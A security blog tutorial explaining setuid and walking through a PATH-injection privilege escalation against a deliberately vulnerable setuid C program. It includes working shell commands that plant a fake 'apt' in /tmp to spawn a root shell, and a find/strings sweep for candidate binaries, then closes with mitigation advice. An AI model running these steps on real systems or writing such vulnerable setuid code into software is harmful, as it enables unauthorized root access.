+++
title = "Privilege escalation using setuid"
date = "2020-09-17"
author = "Aloïs Micard"
authorTwitter = "" #do not include @
cover = ""
tags = ["Security", "Privilege Escalation"]
keywords = ["", ""]
description = ""
showFullContent = false
+++

[Setuid](https://en.wikipedia.org/wiki/Setuid) is a Unix access rights flag that allow users to run an executable 
with the file system permissions of the executable's owner.

For example the following executable:

```sh
$ stat /usr/bin/passwd
  File: /usr/bin/passwd
  Size: 63736     	Blocks: 128        IO Block: 4096   regular file
Device: 801h/2049d	Inode: 2237        Links: 1
Access: (4755/-rwsr-xr-x)  Uid: (    0/    root)   Gid: (    0/    root)
```

will be executed as root (Uid 0), no matter what the current user is.
This allows un-privileged user to change their password by editing `/etc/shadow` (root owner) using passwd.

# How setuid may be exploited?

As you may already guess, being able to run process as different user may have serious implications,
especially if the executable owner is root.

It means that executables with set{g,u}id flag must be carefully designed to prevent any exploitation.
This is generally the case for executables that comes with the OS, but sometimes administrator may install / craft
exploitable executable, that will greatly help hackers escalate privileges.

Let's see how we can exploit a badly designed setuid program to gain root access.

# Exploiting a setuid executable

They are multiple ways to exploit an executable (buffer overflow, stack overflow, etc...)
in this section we will focus on one of the easiest vulnerability to exploit: path injection.

## Path injection

Path injection is a common vulnerability. It happens when an executable refer to
another one without using the full path to it. Let's take an example:

```sh
$ cat apt-updater.c
#include <stdlib.h>
#include <unistd.h>

int main() {
  setuid(0);

  system("apt update");
  system("apt upgrade -y");
  return 0;
}
```

this executable has been designed by a sysadmin to allows non-root users to update the server packages
to their latest version (very bad practice btw).

While it may look simple & secure, it has an **important** vulnerability: a path injection vulnerability:

It uses the [apt](https://manpages.debian.org/buster/apt/apt.8.en.html)
executable but doesn't invoke directly `/usr/bin/apt` but rather relies on apt to be in the [PATH](https://en.wikipedia.org/wiki/PATH_(variable)).

Let's see how we can use this at our advantages by polluting the PATH.

### How the PATH work exactly?

The PATH variable is used to lookup executables when issuing command. It is composed of directories to include
while searching, separated by a semicolon ':'.

For example: `/usr/local/bin:/usr/bin:/bin` means that executables will be searched in the following directories:

- /usr/local/bin
- /usr/bin
- /bin

The search will stop when the executable is found. It means that if apt is present in `/usr/local/bin/apt` it will not
be searched in the others directories.

### Exploiting the vulnerability

Since the executable relies on the PATH to lookup apt location, we can simply create a dummy `apt` executable script
that will open a shell (/bin/sh) and place it in a directory that will be in the PATH.

```sh
$ mkdir /tmp/foo # create random directory to put the script
$ echo /bin/sh > /tmp/foo/apt # create the script that will launch /bin/sh
$ chmod 755 /tmp/foo/apt # mark it as executable
$ PATH=/tmp/foo:$PATH /usr/local/bin/apt-updater # override the PATH variable to that it contains /tmp/foo directory & execute the vulnerable program
# id # we are root!
uid=0(root) gid=1001(creekorful) groups=1001(creekorful)
```

When the OS has look up the apt executable it searches in the following location:

- /tmp/foo
[rest of the path]

since we have appended /tmp/foo at first, the OS was able to find the apt executable in it
and has executed it (with root privileges since they are propagated). 

# Finding vulnerable executables

Search for files with setuid bit set:

```sh
$ find / -xdev -perm -4000 2>/dev/null
/usr/local/bin/apt-updater
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/bin/gpasswd
/usr/bin/mount
/usr/bin/umount
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/su
/usr/bin/sudo
/usr/bin/chfn
/usr/bin/chsh
```

here almost all executables look 'classic' ones and may not be easily vulnerable.

One executable looks interesting: `/usr/local/bin/apt-updater`, it looks manually crafted
and may have been badly designed.

It is fairly easy to determinate if the executable is vulnerable: one could simply look if it calls
other executables without using full path.

This is done easily by using [strings](https://manpages.debian.org/buster/binutils-common/strings.1.en.html)
which is a program used to extract printable characters from a file.

```sh
$ strings /usr/local/bin/apt-updater
/lib64/ld-linux-x86-64.so.2
libc.so.6
setuid
system
__cxa_finalize
__libc_start_main
[...]
apt update
apt upgrade -y
```

It looks like apt-updater run `apt update` and `apt upgrade -y` without using full path. 
Path injection may be possible.

# How to mitigate the exploit?

The easiest way to prevent these exploits is simply by not using set{g,u}id executable at ALL.
I mean, the ones installed by default can be trusted, but you shouldn't make one.

Better & simple options are available, such as using [sudoers](https://linux.die.net/man/5/sudoers) for example.

Happy hacking!
